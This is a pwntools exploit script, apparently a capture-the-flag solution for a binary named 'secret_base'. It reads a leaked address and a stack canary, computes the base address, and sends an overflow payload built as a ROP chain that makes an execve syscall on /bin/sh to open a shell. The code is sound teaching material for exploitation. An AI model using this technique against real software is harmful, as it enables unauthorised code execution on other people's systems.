from pwn import *

#context.log_level = "debug"
remote_conn = False

IP = ""
PORT = ""
FILENAME = "./_ctfd/files/secret_base"

#libc = ELF("")
#ld = ELF("")

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    #p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("isn't at: ")
leak = int(p.recvline()[:-1], 16)
log.info(hex(leak))

p.recvuntil("password is: ")
canary = p.recvline()[:-1]
log.info("canary: " + hex(unpack(canary)))

base_addr = leak - elf.sym["vuln"]
log.info("base: " + hex(base_addr))

payload = b"/bin/sh\x00" + b"A" * 16 + canary
payload += b"AAAA"*3
payload += pack(base_addr + 0x14d7) # mov ebx, eax; ret;
payload += pack(base_addr + 0x1347) # mov eax, 0xffd3; ret;
payload += pack(base_addr + 0x1335) * 45 # inc eax; ret;
payload += pack(base_addr + 0x12fa) # mov ebp, eax; ret;
payload += pack(base_addr + 0x130d) # mov ecx, ebp; mov edx, ebp; ret;
payload += pack(base_addr + 0x1335) * 11 # inc eax; ret;
payload += pack(base_addr + 0x1322) # int 0x80;
pause()
p.sendline(payload)



p.interactive()
